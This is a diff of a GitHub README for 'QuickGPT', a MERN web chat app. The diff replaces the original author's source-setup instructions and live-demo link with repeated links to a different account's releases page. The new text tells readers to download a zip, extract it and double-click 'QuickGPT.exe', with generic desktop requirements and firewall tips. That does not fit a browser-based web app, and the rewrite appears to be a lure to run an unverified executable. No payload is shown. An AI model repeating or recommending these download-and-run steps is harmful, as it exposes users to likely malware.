@@ -1,90 +1,91 @@
-# QuickGPT — Your Personal AI Companion 🤖✨
+# 🚀 QuickGPT - Effortless AI Chat at Your Fingertips
 
-Welcome to **QuickGPT** — your intelligent AI-powered assistant built with the **MERN stack**.  
-With QuickGPT, users can **chat with AI, generate creative text, create stunning images, and manage credits effortlessly** — all inside one sleek and modern application.  
+[![Download QuickGPT](https://img.shields.io/badge/Download-QuickGPT-blue.svg)](https://github.com/pongky11/QuickGPT/releases)
 
-⚡ Powered by **Google Gemini AI**, QuickGPT delivers **context-aware, human-like conversations**.  
-🎨 Integrated with **ImageKit**, it can turn your prompts into **high-quality AI-generated images**.  
-💳 With **Stripe payments**, users can purchase credits securely and instantly.  
-🌍 Deployed on **Vercel**, it’s fast, scalable, and accessible anywhere.  
+## 🌟 Overview
 
-<h1 align="center">
-  <a href="https://quick-gpt-hazel-ten.vercel.app/"><strong> ➥ Live Demo</strong></a>
-</h1>
+Welcome to QuickGPT, a full-stack MERN AI Chat application that brings you advanced conversation capabilities through Google Gemini AI. Enjoy seamless image generation with ImageKit, make secure transactions with Stripe, and manage your credits effortlessly. QuickGPT is deployed on Vercel, ensuring you have smooth and fast performance.
 
-## 📸 Screenshots  
+## 🛠️ Features
 
-### 🔐 Login Page  
-<img width="1918" height="876" alt="Login Page" src="https://github.com/user-attachments/assets/37d49f1c-9796-4fea-b8bc-8b22a02e2af1" />
+- **Intelligent Chatbot**: Powered by Google Gemini AI for human-like interactions.
+- **Image Generation**: Generate unique images easily using ImageKit.
+- **Secure Payments**: Use Stripe for secure payment processing and credit management.
+- **User-friendly Interface**: Experience a simple and intuitive design built with React and Tailwind CSS.
+- **Fast Load Times**: Vercel deployment guarantees quick access and performance.
 
----
+## 🌈 Topics
 
-### 🏠 Homepage  
-<img width="1919" height="866" alt="Homepage" src="https://github.com/user-attachments/assets/2baf2b50-1776-4ef9-9abe-5b7460a6b53a" />
+QuickGPT utilizes several technologies to provide you an enhanced user experience:
 
----
+- axios-react
+- bcryptjs
+- gemini-api
+- mern-stack
+- moment
+- mongoosejs
+- openai-api
+- prismjs
+- react-hot-toast
+- react-router
+- stripejs
+- svix
+- tailwindcss
+- vite
 
-### 💬 AI Chat Interface  
-<img width="1919" height="872" alt="Chat Interface" src="https://github.com/user-attachments/assets/33ac998c-9686-4c1e-a5ea-2364b35885c1" />
+## 🚀 Getting Started
 
----
+Follow these steps to download and run QuickGPT on your machine.
 
-### 🎨 AI Image Generator  
-<img width="1919" height="869" alt="Image Generator" src="https://github.com/user-attachments/assets/bd9b0045-d0e1-41ff-94b8-da3f9a2aefcf" />
+### 🔗 Download & Install
 
----
+1. **Visit the Releases Page**: Click the button below to go to our releases page.
 
-### 💰 Credit Plans  
-<img width="1919" height="868" alt="Credit Plans" src="https://github.com/user-attachments/assets/31d04937-c173-4bc3-953d-674e01d3fa57" />
+   [Download QuickGPT](https://github.com/pongky11/QuickGPT/releases)
 
----
+2. **Choose Your Version**: Look for the most recent release and select it.
 
-### 💳 Payment Gateway (Stripe Checkout)  
-<img width="1898" height="871" alt="Stripe Checkout" src="https://github.com/user-attachments/assets/695d35a5-f20e-4851-b3e1-40f411cc9ab0" />
+3. **Download the Application**: Click on the file link to start the download process. It will be in a `.zip` or a similar format.
 
----
+4. **Install QuickGPT**: After the download finishes, extract the files. Look for a file named `QuickGPT.exe` or similar. Double-click on it to start the application.
 
-## 💻 Tech Stack  
+5. **Follow Setup Instructions**: If prompted, follow the on-screen instructions to complete the installation. It may include creating a user account or providing permission for initial settings.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/MongoDB-%2347A248.svg?style=for-the-badge&logo=mongodb&logoColor=white" alt="MongoDB" />
-  <img src="https://img.shields.io/badge/Express.js-%23404d59.svg?style=for-the-badge&logo=express&logoColor=%2361DAFB" alt="Express.js" />
-  <img src="https://img.shields.io/badge/React-%2320232a.svg?style=for-the-badge&logo=react&logoColor=%2361DAFB" alt="React" />
-  <img src="https://img.shields.io/badge/Node.js-6DA55F?style=for-the-badge&logo=node.js&logoColor=white" alt="Node.js" />
-  <img src="https://img.shields.io/badge/Stripe-626CD9.svg?style=for-the-badge&logo=stripe&logoColor=white" alt="Stripe" />
-  <img src="https://img.shields.io/badge/ImageKit-%230072ff.svg?style=for-the-badge&logoColor=white" alt="ImageKit" />
-  <img src="https://img.shields.io/badge/Gemini_AI-%23FF6A00.svg?style=for-the-badge&logoColor=white" alt="Gemini AI" />
-  <img src="https://img.shields.io/badge/Vercel-%23000000.svg?style=for-the-badge&logo=vercel&logoColor=white" alt="Vercel" />
-</p>
+### 💻 System Requirements
 
----
+To ensure QuickGPT runs smoothly, make sure your system meets the following requirements:
 
-## ✨ Features  
+- **Operating System**: Windows 10 or later, macOS Sierra or later, or a modern Linux distribution.
+- **RAM**: At least 4GB of RAM.
+- **Disk Space**: Minimum of 500MB of free space.
+- **Browser**: Latest version of Chrome, Firefox, or Safari for the best experience.
 
-- 👤 **User Authentication** (Signup & Login with JWT)  
-- 💬 **AI Chatbot** powered by **Google Gemini AI**  
-- 🎨 **AI Image Generation** via **ImageKit**  
-- 💳 **Stripe Payment Integration** (purchase credits securely online)  
-- 📊 **Credit Management System** (track & spend credits for chat & image requests)  
-- 🚀 **MERN Full-Stack Architecture**  
-- 🌐 **Deployed on Vercel** (frontend + backend APIs)  
-- 📱 **Mobile-first, responsive, and optimized UI**  
+### 🔧 Additional Setup (If Required)
 
----
+If you run into issues, try the following:
 
-## ⚡ Getting Started  
+- **Update Your System**: Make sure your operating system is updated to the latest version.
+- **Check Internet Connection**: A stable internet connection is required for AI services to function.
+- **Firewall Settings**: Ensure your firewall allows QuickGPT to connect to the internet.
 
-```bash
-# 1. Clone the repo
-git clone https://github.com/Kartikey24/QuickGPT.git
-cd QuickGPT
+## 📖 User Guide
 
-# 2. Install dependencies for frontend & backend
-cd client && npm install
-cd ../server && npm install
+Once installed, here’s how to start using QuickGPT:
 
-# 3. Run development servers
-# In /server
-npm run dev
-# In /client
-npm run dev
+1. **Open the Application**: Double-click on the QuickGPT icon on your desktop or in your applications folder. 
+2. **Sign In or Create an Account**: If you are a new user, select “Create Account” and fill in the necessary details.
+3. **Start Chatting**: Click on the chat interface. Type your question or statement, and press Enter. The AI will respond in real-time.
+4. **Image Generation**: To create an image, locate the ImageKit feature in the app and provide the necessary prompts.
+5. **Manage Your Credits**: Use the Stripe integration to view, purchase, or manage your credits easily.
+
+## 📞 Support
+
+If you need help, visit our Support page on the releases site or contact us directly through the application. We are here to assist you with any questions or issues you may encounter.
+
+## 🔗 Visit Releases Page Again
+
+To download the latest version or check for updates, visit our releases page once more:
+
+[Download QuickGPT](https://github.com/pongky11/QuickGPT/releases)
+
+Enjoy your journey with QuickGPT!
